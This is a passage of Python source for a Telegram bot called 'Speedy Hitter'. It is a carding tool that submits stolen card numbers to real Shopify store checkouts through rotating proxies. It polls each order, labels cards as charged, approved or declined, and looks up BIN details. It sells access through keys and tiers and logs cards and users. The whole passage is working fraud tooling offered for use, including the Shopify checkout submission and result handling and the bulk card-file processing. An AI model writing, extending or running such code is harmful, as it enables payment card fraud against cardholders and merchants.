                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    print(f"  Tax changed, retrying ({tax_attempt}/{MAX_TAX_RETRIES})")
                    new_tax   = extract_tax_from_rejected(submit_body)
                    new_total = extract_total_from_rejected(submit_body)
                    if new_tax:
                        current_tax = new_tax
                    if new_total:
                        current_total = new_total
                    time.sleep(0.05)
                    continue
                break

            check_submit_errors(submit_status, submit_body)

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                error_msg = extract_any_error(submit_body)
                if "CAPTCHA" in (error_msg or ""):
                    error_msg = "CARD_DECLINED"
                if error_msg:
                    print(f"  Submit Error: {error_msg}")
                    result.status      = CheckStatus.DECLINED
                    result.status_code = error_msg
                    result.error       = Exception(error_msg)
                    result.retryable   = any(k in error_msg.lower() for k in ["inventory", "retry", "try again", "generic"])
                else:
                    result.status    = CheckStatus.ERROR
                    result.error     = Exception("Step 10 failed: could not extract receiptId or error message")
                    result.retryable = True
                return result

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("Step 10 failed: could not extract sessionToken")
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.error  = e
            return result

        # Step 11 — poll
        poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
        type_name_re  = re.compile(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')

        for poll_num in range(1, 6):
            try:
                _, poll_body = send_poll_for_receipt(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    build_id, source_token, poll_for_receipt_id, receipt_id, receipt_session_token
                )

                receipt_type = ""
                match = type_name_re.search(poll_body)
                if match:
                    receipt_type = match.group(1)

                status_code = extract_receipt_status_code(poll_body, receipt_type)
                result.status_code = status_code

                if receipt_type in ["SuccessfulReceipt", "ProcessedReceipt"]:
                    print(f"  Poll {poll_num}: SUCCESS! Order placed!")
                    result.status      = CheckStatus.CHARGED
                    result.status_code = "ORDER_PLACED"
                    try:
                        poll_json   = json.loads(poll_body)
                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
                        conf_url    = receipt_obj.get("confirmationPage", {}).get("url", "")
                        result.receipt_url = conf_url or checkout_url
                    except Exception:
                        result.receipt_url = checkout_url
                    return result

                if receipt_type == "ActionRequiredReceipt":
                    print(f"  Poll {poll_num}: 3DS_AUTHENTICATION")
                    result.status      = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    return result

                if receipt_type == "FailedReceipt":
                    error_code = ""
                    error_re   = re.compile(r'"code"\s*:\s*"([^"]+)"')
                    match      = error_re.search(poll_body)
                    if match:
                        error_code = match.group(1)
                    if "CAPTCHA" in error_code:
                        error_code = "CARD_DECLINED"

                    if error_code == "INSUFFICIENT_FUNDS":
                        result.status      = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                        return result
                    elif error_code == "CARD_DECLINED":
                        result.status = CheckStatus.DECLINED
                        result.error  = Exception(f"{error_code}")
                        return result
                    elif error_code == "GENERIC_ERROR":
                        result.status      = CheckStatus.DECLINED
                        result.status_code = "CARD_DECLINED"
                        result.error       = Exception("CARD_DECLINED")
                        return result
                    else:
                        if "InventoryReservationFailure" in poll_body:
                            result.status    = CheckStatus.ERROR
                            result.retryable = True
                            return result
                        result.status = CheckStatus.DECLINED
                        result.error  = Exception(f"{error_code}")
                        return result

                delay = 500
                match = poll_delay_re.search(poll_body)
                if match:
                    try:
                        d = int(match.group(1))
                        if d > 0:
                            delay = d
                    except ValueError:
                        pass
                time.sleep(min(delay, 300) / 1000.0)

            except Exception as e:
                result.status = CheckStatus.ERROR
                result.error  = Exception(f"poll {poll_num} failed: {e}")
                return result

        result.status = CheckStatus.ERROR
        result.error  = Exception("exceeded poll attempts")
        return result

    finally:
        client.close()


def load_card_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        card_data = f.read()
    raw_lines = card_data.replace('\r\n', '\n').split('\n')
    entries = [ln.strip() for ln in raw_lines if ln.strip()]
    if len(entries) == 0:
        raise Exception(f"no card entries found in {file_path}")
    return entries

def parse_card_entry(card_entry: str) -> Tuple[str, int, int, str]:
    card_parts = card_entry.strip().split('|')
    if len(card_parts) != 4:
        raise Exception(f"invalid card format in file: {card_entry}")
    try:
        card_month = int(card_parts[1])
        card_year  = int(card_parts[2])
    except ValueError as e:
        raise Exception(f"invalid card month/year in file: {e}")
    return card_parts[0], card_month, card_year, card_parts[3]

def load_proxy_entries(file_path: str) -> List[str]:
    with open(file_path, 'r') as f:
        data = f.read()
    lines = data.split('\n')
    entries = [ln.strip() for ln in lines if ln.strip() and not ln.strip().startswith('#')]
    if len(entries) == 0:
        raise Exception(f"no proxy entries found in {file_path}")
    return entries

# ──────────────────────── proxy normalisation ────────────────────────

def _is_base64url(s: str) -> bool:
    if len(s) < 16:
        return False
    return bool(re.fullmatch(r'[A-Za-z0-9\-_]+=*', s))

def _decode_base64url(s: str) -> str:
    import base64 as _b64
    try:
        b = s.replace('-', '+').replace('_', '/')
        b += '=' * ((4 - len(b) % 4) % 4)
        return _b64.b64decode(b).decode('utf-8', errors='replace')
    except Exception:
        return s

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    if '://' in p:
        parsed = urllib.parse.urlparse(p)
        if not parsed.netloc:
            raise Exception(f"invalid proxy URL: {raw}")
        return p
    parts = p.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        if _is_base64url(user):
            user = _decode_base64url(user)
        if _is_base64url(pwd):
            pwd = _decode_base64url(pwd)
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{p}"
    raise Exception(f"unrecognised proxy format: {raw!r}")

def test_proxy(proxy_url: str) -> bool:
    try:
        session = requests.Session()
        session.proxies = {'http': proxy_url, 'https': proxy_url}
        resp = session.get("https://api.ipify.org?format=json", timeout=10)
        if resp.status_code == 200 and resp.text.strip():
            return True
    except Exception as e:
        print(f"  Proxy test failed: {e}")
    return False

def find_working_proxies(proxies: List[str]) -> List[str]:
    working = []
    seen = set()
    for i, raw in enumerate(proxies):
        try:
            proxy_url = normalize_proxy(raw)
        except Exception as e:
            print(f"[Proxy {i+1}/{len(proxies)}] Invalid entry skipped: {e}")
            continue
        if proxy_url in seen:
            continue
        print(f"[Proxy {i+1}/{len(proxies)}] Testing {proxy_url}")
        if test_proxy(proxy_url):
            seen.add(proxy_url)
            working.append(proxy_url)
            print(f"[Proxy {i+1}/{len(proxies)}] OK, added to rotation.")
    if len(working) == 0:
        raise Exception("no working proxy found")
    return working


# =============================================================================
#  BOT LAYER — Telethon
# =============================================================================

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.messages import SendMessageRequest
from telethon.tl.types import ReplyKeyboardHide
import aiohttp
import aiofiles
import threading
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from datetime import timedelta, timezone
import secrets
import string


def fi(text: str) -> str:
    out = []
    for c in text:
        if 'A' <= c <= 'Z':
            out.append(chr(0x1D63C + ord(c) - 65))
        elif 'a' <= c <= 'z':
            out.append(chr(0x1D656 + ord(c) - 97))
        else:
            out.append(c)
    return ''.join(out)


# ─── CONFIG (all env-driven) ────────────────────────────────────────
API_ID    = int(_env("API_ID", "0") or 0)
API_HASH  = _env("API_HASH", "")
BOT_TOKEN = _env("BOT_TOKEN", "")

_ADMIN_FILE = os.path.join(os.path.dirname(__file__), 'admin.json')

_DEFAULT_ADMINS = {
    int(x.strip()) for x in _env("ADMIN_ID", "").split(',')
    if x.strip().isdigit()
}

def _load_admin_ids() -> set:
    try:
        with open(_ADMIN_FILE) as f:
            data = json.load(f)
            ids  = data.get('admin_ids', [])
        return set(ids) | _DEFAULT_ADMINS if ids else _DEFAULT_ADMINS
    except Exception:
        return _DEFAULT_ADMINS

def _save_admin_ids(ids: set):
    try:
        with open(_ADMIN_FILE, 'w') as f:
            json.dump({'admin_ids': list(ids)}, f)
    except Exception:
        pass

ADMIN_IDS = _load_admin_ids()
ADMIN_ID  = min(ADMIN_IDS) if ADMIN_IDS else 0

OWNER_NAME     = _env("OWNER_NAME", "Bot Owner")
OWNER_USERNAME = _env("OWNER_USERNAME", "")
OWNER_ID       = int(_env("OWNER_ID", "0") or 0)
BOT_BRAND      = _env("BOT_BRAND", "Speedy Hitter")
KEY_PREFIX     = _env("KEY_PREFIX", "SPEEDY")
SESSION_NAME   = _env("SESSION_NAME", "speedy_hitter")

DEV_LINE = (
    f'[DEV] -> <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'
    if OWNER_USERNAME and OWNER_USERNAME != "your_handle"
    else f'[DEV] -> {OWNER_NAME}'
)

PREMIUM_FILE        = os.path.join(os.path.dirname(__file__), 'premium.txt')
SITES_FILE          = os.path.join(os.path.dirname(__file__), 'sites.txt')
PROXY_FILE          = os.path.join(os.path.dirname(__file__), 'proxy.txt')
USER_PROXY_FILE     = os.path.join(os.path.dirname(__file__), 'user_proxies.json')
KEYS_FILE           = os.path.join(os.path.dirname(__file__), 'keys.json')
USER_ACCESS_FILE    = os.path.join(os.path.dirname(__file__), 'user_access.json')
WORKING_PROXY_FILE  = os.path.join(os.path.dirname(__file__), 'working_proxies.txt')
USER_POOL_FILE      = os.path.join(os.path.dirname(__file__), 'user_pool.json')
STATS_FILE          = os.path.join(os.path.dirname(__file__), 'user_stats.json')
LOGS_FILE           = os.path.join(os.path.dirname(__file__), 'card_logs.json')
SITES_META_FILE_ABS = os.path.join(os.path.dirname(__file__), 'sites_meta.json')
USER_PREFS_FILE     = os.path.join(os.path.dirname(__file__), 'user_prefs.json')
MAX_LOG_ENTRIES     = 25000

AMOUNT_TIERS = {
    "1":  ("$1",  "~$1 sites"),
    "5":  ("$5",  "~$5 sites"),
    "10": ("$10", "~$10 sites"),
    "20": ("$20", "~$20 sites"),
    "any":("Any", "All sites"),
}

_TIER_ORDER = ["1", "5", "10", "20"]

TIER_LIMITS = {
    "admin": 25000,
    "auth":  25000,
    "grant": 25000,
    "key":   25000,
}

NOTIFY_GROUP_ID = None

MANDATORY_CHANNELS_FILE = os.path.join(os.path.dirname(__file__), 'mandatory_channels.json')

# ─── MANDATORY SUBSCRIPTION ────────────────────────────────────────
EM_SUB_PANEL = '<tg-emoji emoji-id="6266818250818983044">A</tg-emoji>'
EM_SUB_ADD   = '<tg-emoji emoji-id="6267115986541877538">*</tg-emoji>'
EM_SUB_DEL   = '<tg-emoji emoji-id="6267000941547885720">X</tg-emoji>'

def load_mandatory_channels() -> list:
    try:
        if os.path.exists(MANDATORY_CHANNELS_FILE):
            with open(MANDATORY_CHANNELS_FILE, 'r') as f:
                data = json.load(f)
                return data if isinstance(data, list) else []
    except Exception:
        pass
    return []

def save_mandatory_channels(channels: list):
    with open(MANDATORY_CHANNELS_FILE, 'w') as f:
        json.dump(channels, f, ensure_ascii=False, indent=2)


# ─── stats ────────────────────────────────────────────────────────
_stats_lock = threading.Lock()
_logs_lock  = threading.Lock()

def _load_stats() -> dict:
    try:
        with open(STATS_FILE) as f:
            return json.load(f)
    except Exception:
        return {}

def _save_stats(data: dict):
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def record_check(uid: int, name: str, status: str, username: str = ''):
    with _stats_lock:
        data = _load_stats()
        key  = str(uid)
        entry = data.get(key, {'charged':0,'approved':0,'declined':0,'files':0,'first_seen':0})
        if not entry.get('first_seen'):
            entry['first_seen'] = int(time.time())
        entry['name']      = name
        if username:
            entry['username'] = username
        entry['last_seen'] = int(time.time())
        if status == 'Charged':
            entry['charged']  = entry.get('charged',  0) + 1
        elif status == 'Approved':
            entry['approved'] = entry.get('approved', 0) + 1
        else:
            entry['declined'] = entry.get('declined', 0) + 1
        data[key] = entry
        _save_stats(data)

def record_mass_check(uid: int, name: str, charged: int, approved: int, declined: int, username: str = ''):
    with _stats_lock:
        data = _load_stats()
        key  = str(uid)
        entry = data.get(key, {'charged':0,'approved':0,'declined':0,'files':0,'first_seen':0})
        if not entry.get('first_seen'):
            entry['first_seen'] = int(time.time())
        entry['name']      = name
        if username:
            entry['username'] = username
        entry['last_seen'] = int(time.time())
        entry['charged']   = entry.get('charged',  0) + charged
        entry['approved']  = entry.get('approved', 0) + approved
        entry['declined']  = entry.get('declined', 0) + declined
        entry['files']     = entry.get('files', 0) + 1
        data[key] = entry
        _save_stats(data)

def record_log(uid: int, name: str, username: str,
               card: str, status: str, message: str,
               site: str, gateway: str, price: str):
    with _logs_lock:
        try:
            logs = json.loads(open(LOGS_FILE).read()) if os.path.exists(LOGS_FILE) else []
        except Exception:
            logs = []
        logs.insert(0, {
            "ts":       int(time.time()),
            "uid":      str(uid),
            "name":     name,
            "username": username,
            "card":     card,
            "status":   status,
            "message":  message,
            "site":     site,
            "gateway":  gateway,
            "price":    price,
        })
        if len(logs) > MAX_LOG_ENTRIES:
            logs = logs[:MAX_LOG_ENTRIES]
        try:
            with open(LOGS_FILE, 'w') as f:
                json.dump(logs, f)
        except Exception:
            pass


# ─── sites meta ────────────────────────────────────────────────────
def load_sites_meta() -> dict:
    try:
        with open(SITES_META_FILE_ABS) as f:
            return json.load(f)
    except Exception:
        return {}

def save_sites_meta(data: dict):
    try:
        with open(SITES_META_FILE_ABS, 'w') as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

def tag_site_tier(site_url: str, tier: str):
    meta = load_sites_meta()
    meta.setdefault(site_url, {})['tier'] = tier
    save_sites_meta(meta)

def price_to_tier(price: float) -> str:
    if price < 3.0:  return "1"
    if price < 8.0:  return "5"
    if price < 15.0: return "10"
    return "20"


# ─── user prefs ────────────────────────────────────────────────────
def get_user_amount_tier(uid: int) -> str:
    try:
        with open(USER_PREFS_FILE) as f:
            prefs = json.load(f)
        return prefs.get(str(uid), {}).get('amount_tier', 'any')
    except Exception:
        return 'any'

def set_user_amount_tier(uid: int, tier: str):
    try:
        try:
            with open(USER_PREFS_FILE) as f:
                prefs = json.load(f)
        except Exception:
            prefs = {}
        prefs.setdefault(str(uid), {})['amount_tier'] = tier
        with open(USER_PREFS_FILE, 'w') as f:
            json.dump(prefs, f, indent=2)
    except Exception:
        pass

def tier_range_label(tier: str) -> str:
    if tier == 'any' or tier not in _TIER_ORDER:
        return 'Any'
    idx = _TIER_ORDER.index(tier)
    if idx == 0:
        return f'${tier}'
    return f'$1-${tier}'

def load_sites_for_user(uid: int) -> tuple:
    all_sites = load_sites()
    tier = get_user_amount_tier(uid)
    if tier == 'any':
        return all_sites, 'any'
    meta = load_sites_meta()
    if tier in _TIER_ORDER:
        cutoff = _TIER_ORDER.index(tier)
        allowed_tiers = set(_TIER_ORDER[:cutoff + 1])
    else:
        allowed_tiers = {tier}
    matched = [s for s in all_sites if meta.get(s, {}).get('tier') in allowed_tiers]
    if matched:
        return matched, tier
    return all_sites, 'any'


# ─── key system & timed access ─────────────────────────────────────
_keys_data   = {}
_user_access = {}

def load_keys():
    global _keys_data
    if os.path.exists(KEYS_FILE):
        try:
            with open(KEYS_FILE, 'r') as f: _keys_data = json.load(f)
        except Exception: _keys_data = {}

def save_keys():
    try:
        with open(KEYS_FILE, 'w') as f: json.dump(_keys_data, f, indent=2)
    except Exception: pass

def load_user_access():
    global _user_access
    if os.path.exists(USER_ACCESS_FILE):
        try:
            with open(USER_ACCESS_FILE, 'r') as f:
                _user_access = {int(k): v for k, v in json.load(f).items()}
        except Exception: _user_access = {}

def save_user_access():
    try:
        with open(USER_ACCESS_FILE, 'w') as f:
            json.dump({str(k): v for k, v in _user_access.items()}, f, indent=2)
    except Exception: pass

def generate_key():
    chars = string.ascii_letters + string.digits
    rand  = ''.join(secrets.choice(chars) for _ in range(20))
    return f"{KEY_PREFIX}-{rand}"

def _now_utc():
    return datetime.now(timezone.utc)

def set_user_access(uid: int, tier: str, plan_days: int, granted_by="admin"):
    expires = (_now_utc() + timedelta(days=plan_days)).isoformat()
    _user_access[uid] = {
        "tier":       tier,
        "expires_at": expires,
        "plan_days":  plan_days,
        "granted_by": granted_by,
        "granted_at": _now_utc().isoformat(),
    }
    save_user_access()

def revoke_user_access(uid: int):
    _user_access.pop(uid, None)
    save_user_access()

def is_access_valid(uid: int) -> bool:
    acc = _user_access.get(uid)
    if not acc: return False
    try:
        exp = datetime.fromisoformat(acc['expires_at'])
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        return _now_utc() < exp
    except Exception: return False

def time_remaining(uid: int) -> str | None:
    acc = _user_access.get(uid)
    if not acc: return None
    try:
        exp = datetime.fromisoformat(acc['expires_at'])
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        delta = exp - _now_utc()
        if delta.total_seconds() <= 0: return None
        d = delta.days; h = delta.seconds // 3600; m = (delta.seconds % 3600) // 60
        if d > 0:  return f"{d}d {h}h {m}m"
        if h > 0:  return f"{h}h {m}m"
        return f"{m}m"
    except Exception: return None

load_keys()
load_user_access()


# ─── user proxy storage ────────────────────────────────────────────
user_proxies: dict = {}

def load_user_proxies():
    global user_proxies
    if not os.path.exists(USER_PROXY_FILE):
        user_proxies = {}
        return
    try:
        with open(USER_PROXY_FILE, 'r') as f:
            raw = json.load(f)
        migrated = {}
        for k, v in raw.items():
            uid_int = int(k)
            if isinstance(v, list):
                migrated[uid_int] = [x for x in v if isinstance(x, str) and x.strip()]
            elif isinstance(v, str) and v.strip():
                migrated[uid_int] = [v.strip()]
            else:
                migrated[uid_int] = []
        user_proxies = migrated
    except Exception:
        user_proxies = {}

def save_user_proxies():
    try:
        with open(USER_PROXY_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_proxies.items()}, f, indent=2)
    except Exception:
        pass

def get_user_proxy(uid: int):
    lst = user_proxies.get(uid, [])
    return lst[0] if lst else None

def get_user_proxy_list(uid: int) -> list:
    return list(user_proxies.get(uid, []))

def set_user_proxy(uid: int, proxy: str):
    user_proxies[uid] = [proxy.strip()]
    save_user_proxies()

def add_user_proxies_bulk(uid: int, proxies: list) -> dict:
    lst    = user_proxies.setdefault(uid, [])
    exists = set(lst)
    added = dups = invalid = 0
    seen_batch: set = set()
    for p in proxies:
        p = p.strip()
        if not p or p.startswith('#'):
            continue
        if not _validate_proxy_fmt(p):
            invalid += 1
            continue
        if p in exists or p in seen_batch:
            dups += 1
            continue
        lst.append(p)
        seen_batch.add(p)
        added += 1
    if added:
        save_user_proxies()
    return {'added': added, 'duplicates': dups, 'invalid': invalid}

def remove_user_proxy(uid: int):
    user_proxies.pop(uid, None)
    save_user_proxies()

def remove_user_proxy_entry(uid: int, proxy: str) -> bool:
    lst   = user_proxies.get(uid, [])
    proxy = proxy.strip()
    if proxy not in lst:
        return False
    lst.remove(proxy)
    if not lst:
        user_proxies.pop(uid, None)
    save_user_proxies()
    return True

def clear_user_proxies(uid: int):
    user_proxies.pop(uid, None)
    save_user_proxies()

load_user_proxies()

# ─── user pool toggle ──────────────────────────────────────────────
user_pool_enabled: dict = {}

def load_user_pool():
    global user_pool_enabled
    if os.path.exists(USER_POOL_FILE):
        try:
            with open(USER_POOL_FILE, 'r') as f:
                user_pool_enabled = {int(k): v for k, v in json.load(f).items()}
        except Exception: user_pool_enabled = {}

def save_user_pool():
    try:
        with open(USER_POOL_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_pool_enabled.items()}, f)
    except Exception: pass

load_user_pool()


# ─── helpers ───────────────────────────────────────────────────────
def get_file_lines(fp):
    if not os.path.exists(fp): return []
    try:
        with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
            return [l.strip() for l in f if l.strip()]
    except Exception: return []

def load_premium_users(): return get_file_lines(PREMIUM_FILE)
def load_sites():         return get_file_lines(SITES_FILE)
def load_proxies():       return get_file_lines(PROXY_FILE)

def is_admin(uid): return uid in ADMIN_IDS or uid in _DEFAULT_ADMINS

def is_premium(uid: int) -> bool:
    if is_admin(uid): return True
    if is_access_valid(uid): return True
    if str(uid) in load_premium_users(): return True
    return False

def get_user_tier(uid: int):
    if is_admin(uid): return "admin"
    if is_access_valid(uid): return _user_access[uid].get('tier', 'key')
    if str(uid) in load_premium_users(): return "admin"
    return None

def get_user_limit(uid: int) -> int:
    tier = get_user_tier(uid)
    return TIER_LIMITS.get(tier, 0)

def extract_cc(text):
    matches = re.findall(r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', text)
    cards = []
    for card, month, year, cvv in matches:
        if len(year) == 2: year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def _validate_proxy_fmt(p: str) -> bool:
    p = p.strip()
    if not p or ':' not in p:
        return False
    if '://' in p:
        try:
            r = urllib.parse.urlparse(p)
            return bool(r.hostname) and r.port is not None and 1 <= r.port <= 65535
        except Exception:
            return False
    parts = p.split(':')
    try:
        port = int(parts[1])
        return bool(parts[0]) and 1 <= port <= 65535
    except (ValueError, IndexError):
        return False

def _validate_site_fmt(u: str) -> bool:
    u = u.strip()
    if not u: return False
    try:
        r = urllib.parse.urlparse(u)
        return r.scheme in ('http', 'https') and bool(r.netloc)
    except Exception:
        return False

def _normalise_site(u: str) -> str:
    return u.rstrip('/')

def _tokenise(text: str) -> list:
    tokens = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        tokens.extend(line.split())
    return tokens

async def get_display_name(uid):
    try:
        entity = await bot.get_entity(uid)
        name = (entity.first_name or "").strip()
        if getattr(entity, 'last_name', None):
            name = f"{name} {entity.last_name}".strip()
        return name or f"User {uid}"
    except Exception:
        return f"User {uid}"

async def get_display_info(uid):
    try:
        entity = await bot.get_entity(uid)
        name = (entity.first_name or "").strip()
        if getattr(entity, 'last_name', None):
            name = f"{name} {entity.last_name}".strip()
        username = getattr(entity, 'username', '') or ''
        return name or f"User {uid}", username
    except Exception:
        return f"User {uid}", ''

def get_proxies_for_user(uid):
    personal    = get_user_proxy_list(uid)
    global_pool = load_proxies()
    pool_on     = user_pool_enabled.get(uid, True)
    if is_admin(uid):
        if personal:
            return (personal + global_pool) if pool_on else personal
        return global_pool if pool_on else []
    return personal

async def get_bin_info(card_number):
    try:
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            async with s.get(f'https://bins.antipublic.cc/bins/{card_number[:6]}') as r:
                if r.status != 200:
                    return '-', '-', '-', '-', '-', ''
                d = json.loads(await r.text())
                return (d.get('brand', '-'), d.get('type', '-'), d.get('level', '-'),
                        d.get('bank', '-'), d.get('country_name', '-'), d.get('country_flag', ''))
    except Exception:
        return '-', '-', '-', '-', '-', ''


# ─── result card ───────────────────────────────────────────────────
SEP = "━━━━━━━━━━━━━━━━━━━━"

def build_result_card(result, bin_info, uid, cname):
    brand, btype, level, bank, country, flag = bin_info

    if result['status'] == 'Charged':
        header, status_label = f"CHARGED", f"Charged"
    elif result['status'] == 'Approved':
        header, status_label = f"APPROVED", f"Approved"
    elif result['status'] == 'OTP':
        header, status_label = f"OTP REQUIRED", f"OTP Required"
    else:
        header, status_label = f"DECLINED", f"Declined"

    gate = result.get('gateway', 'Shopify Payments')
    price_val = result.get('price', '-')
    price_str = f"${price_val}" if price_val not in ('-', '', None) else '-'
    receipt_url = result.get('receipt_url', '')
    receipt_line = (
        f"\nReceipt: <a href=\"{receipt_url}\">View Order Receipt</a>"
        if result['status'] == 'Charged' and receipt_url else ''
    )

    return pe(
        f"<b>{header}</b>\n"
        f"<b>{SEP}</b>\n"
        f"Card: <tg-spoiler><code>{result['card']}</code></tg-spoiler>\n"
        f"Status: {status_label}\n"
        f"Response: <i>{result['message']}</i>\n"
        f"Gateway: <i>{gate}</i>\n"
        f"<b>{SEP}</b>\n"
        f"<blockquote>"
        f"Info: <i>{brand} | {btype} {level}</i>\n"
        f"Bank: <i>{bank}</i>\n"
        f"Country: <i>{country} {flag}</i>\n"
        f"Price: <b><i>{price_str}</i></b>"
        f"</blockquote>\n"
        f"<b>{SEP}</b>\n"
        f"Checked by -> <a href=\"tg://user?id={uid}\">{cname}</a>\n"
        f"{DEV_LINE}"
        f"{receipt_line}"
    )


# ─── PE emoji ──────────────────────────────────────────────────────
PREMIUM_EMOJI_IDS = {
    "✅":  "6034905633336070030",
    "❌":  "5040042498634810056",
    "⚠️": "5420323339723881652",
    "🔥":  "5424972470023104089",
    "💰":  "5039789890133296083",
    "🏦":  "6089185885289454318",
    "🌐":  "6321225560789877992",
    "📡":  "5447448489149625830",
}

def pe(text):
    if not text: return text
    holders = []
    result  = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        ph = f"\x00PE{i:03d}\x00"
        holders.append((ph, doc_id, emoji))
        result = result.replace(emoji, ph)
    for ph, doc_id, emoji in holders:
        result = result.replace(ph, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result


# ─── client ───────────────────────────────────────────────────────
SESSION_FILE = os.path.join(os.path.dirname(__file__), SESSION_NAME)
bot = TelegramClient(SESSION_FILE, API_ID, API_HASH)
TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

active_sessions = {}
pending_checks  = {}


# ─── mandatory sub gate ───────────────────────────────────────────
async def check_user_subscribed(uid: int) -> list:
    channels = load_mandatory_channels()
    if not channels:
        return []
    not_subbed = []
    for ch in channels:
        try:
            member = await bot.get_permissions(ch['id'], uid)
            if member is None or getattr(member, 'banned', False):
                not_subbed.append(ch)
        except Exception:
            pass
    return not_subbed

def build_sub_gate_keyboard(missing_channels: list) -> list:
    rows = []
    for ch in missing_channels:
        rows.append([{"text": f"📢 {ch.get('title', 'Channel')}", "url": ch.get('url', '')}])
    rows.append([{"text": "✅ Subscribed - Check Again", "callback_data": "check_sub_again"}])
    return rows

async def enforce_subscription(event) -> bool:
    uid = event.sender_id
    if is_admin(uid):
        return True
    missing = await check_user_subscribed(uid)
    if not missing:
        return True
    ch_lines = "\n".join(f"  - <a href='{c['url']}'>{html.escape(c.get('title','Channel'))}</a>" for c in missing)
    text = pe(
        f"<b>Subscription Required</b>\n"
        f"<b>{SEP}</b>\n"
        f"Subscribe to continue:\n\n"
        f"{ch_lines}\n\n"
        f"<b>{SEP}</b>\n"
        f"After subscribing, tap below."
    )
    await raw_send(uid, text, build_sub_gate_keyboard(missing))
    return False


# ─── raw telegram helpers ─────────────────────────────────────────
_http_session = requests.Session()
_http_session.verify = False
_adapter = requests.adapters.HTTPAdapter(pool_connections=8, pool_maxsize=32, max_retries=1)
_http_session.mount("https://", _adapter)
_http_session.mount("http://", _adapter)

def _raw_post(url, payload):
    p = dict(payload)
    if "reply_markup" in p and isinstance(p["reply_markup"], dict):
        p["reply_markup"] = json.dumps(p["reply_markup"], ensure_ascii=False)
    try:
        return _http_session.post(url, json=p, timeout=8).json()
    except Exception:
        return {"ok": False}

async def raw_send(chat_id, text, kb_rows, parse_mode="HTML", reply_to=None):
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode,
        "reply_markup": {"inline_keyboard": kb_rows} if kb_rows else None,
        "disable_web_page_preview": True,
    }
    if reply_to:
        payload["reply_to_message_id"] = reply_to
    if payload["reply_markup"] is None:
        payload.pop("reply_markup")
    url  = f"{TG_API}/sendMessage"
    resp = await asyncio.to_thread(_raw_post, url, payload)
    if resp.get("ok"):
        return resp["result"]["message_id"]
    return None


# ─── BUTTON ROWS ──────────────────────────────────────────────────
def rows_main():
    return [
        [{"text": "Gates", "callback_data": "gates"}],
        [{"text": "Contact", "url": f"https://t.me/{OWNER_USERNAME}" if OWNER_USERNAME else "https://t.me/telegram"},
         {"text": "Close",   "callback_data": "close"}],
    ]


# ─── START ────────────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = event.sender_id
    if not await enforce_subscription(event):
        return
    try:
        sender    = await bot.get_entity(uid)
        username  = f"@{sender.username}" if sender.username else f"ID:{uid}"
        firstname = sender.first_name or "User"
    except Exception:
        username  = f"ID:{uid}"
        firstname = "User"

    tier = get_user_tier(uid)
    trem = time_remaining(uid)

    if is_admin(uid):          status_line = "Admin"
    elif tier == "auth":       status_line = f"Auth - {trem} left" if trem else "Auth Expired"
    elif tier == "key":        status_line = f"Key - {trem} left"  if trem else "Key Expired"
    elif tier:                 status_line = "Premium"
    else:                      status_line = "No Access"

    lim = get_user_limit(uid)

    caption = pe(
        f"<b>{BOT_BRAND}</b>\n"
        f"<b>{SEP}</b>\n"
        f"User: {firstname}\n"
        f"Handle: {username}\n"
        f"ID: <code>{uid}</code>\n"
        f"<b>{SEP}</b>\n"
        f"Status: {status_line}\n"
        f"Limit: {lim if lim else 'N/A'} cards/file\n"
        f"<b>{SEP}</b>\n"
        f"Single: <code>/sh card|mm|yy|cvv</code>\n"
        f"Mass: Reply to .txt with <code>/msh</code>\n"
        f"<b>{SEP}</b>\n"
        f"{DEV_LINE}"
    )
    await raw_send(uid, caption, rows_main())


# ─── SINGLE CHECK ─────────────────────────────────────────────────
@bot.on(events.NewMessage(pattern=r'^/sh\s+'))
async def single_check(event):
    uid = event.sender_id
    if not await enforce_subscription(event): return
    if not is_premium(uid):
        await event.reply(pe("Access Denied. Use /redeem to activate a key."), parse_mode='html'); return

    card_raw = event.message.text.split(None, 1)[1].strip()
    cards = extract_cc(card_raw)
    if not cards:
        await event.reply(pe("Invalid format. Use: <code>/sh 4111111111111111|12|2026|123</code>"), parse_mode='html'); return

    card = cards[0]
    sites, _eff_tier = load_sites_for_user(uid)
    proxies = get_proxies_for_user(uid) or load_proxies()

    if not sites:
        await event.reply(pe("No sites configured. Contact admin."), parse_mode='html'); return
    if not proxies:
